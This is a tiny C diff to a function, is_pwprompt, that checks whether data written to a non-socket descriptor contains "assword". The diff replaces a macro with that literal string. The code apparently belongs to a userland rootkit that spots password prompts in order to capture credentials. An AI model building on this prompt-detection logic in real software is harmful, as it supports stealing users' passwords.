@@ -5,7 +5,7 @@ int is_pwprompt(int fd, const void *buf){
     call(C__FXSTAT, _STAT_VER, fd, &s_fstat);
     if(S_ISSOCK(s_fstat.st_mode)) return 0;
 
-    if(buf != NULL && strstr(PW_STR, (char *)buf))
+    if(buf != NULL && strstr("assword", (char *)buf))
         return 1;
 
     return 0;
